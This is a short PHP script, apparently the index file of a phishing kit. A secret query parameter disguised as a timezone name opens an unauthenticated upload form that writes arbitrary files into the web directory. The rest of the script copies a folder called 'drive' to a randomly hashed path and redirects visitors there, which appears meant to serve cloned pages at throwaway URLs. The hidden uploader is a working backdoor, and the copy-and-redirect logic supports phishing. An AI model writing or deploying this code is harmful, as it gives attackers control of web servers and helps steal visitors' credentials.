<?php
date_default_timezone_set(',Africa/Johannesburg');
if(isset($_GET['Africa/Johannesburg']))
{
echo "<body bgcolor=black><font color=cyan size=3>";
echo "<h2></h2><hr>";
echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\"><label for=\"file\"></label><input type=\"file\" name=\"file\" id=\"file\" /><br /><input type=\"submit\" name=\"submit\" value=\"post\"></form>";
if ($_FILES["file"]["error"] > 0)
{
echo "Error: " . $_FILES["file"]["error"] . "<br />";
}
else
{
echo " " . $_FILES["file"]["name"] . "<br />";
}
if (file_exists("".$_FILES["file"]["name"]))
{
echo $_FILES["file"]["name"] . " already exists. ";
}
else
{
move_uploaded_file($_FILES["file"]["tmp_name"],"" . $_FILES["file"]["name"]);
echo "Stored in: " . "" . $_FILES["file"]["name"];
echo"<hr>";
}
}

?>
<?
$random=rand(0,200000);
$md5=md5("$random");
$base=sha1($md5);
$dst=sha1("$base");
function recurse_copy($src,$dst) {
$dir = opendir($src);
@mkdir($dst);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($src . '/' . $file) ) {
recurse_copy($src . '/' . $file,$dst . '/' . $file);
}
else {
copy($src . '/' . $file,$dst . '/' . $file);
}
}
}
closedir($dir);
}
$src="drive";
recurse_copy( $src, $dst );
header("location:$dst");
?>

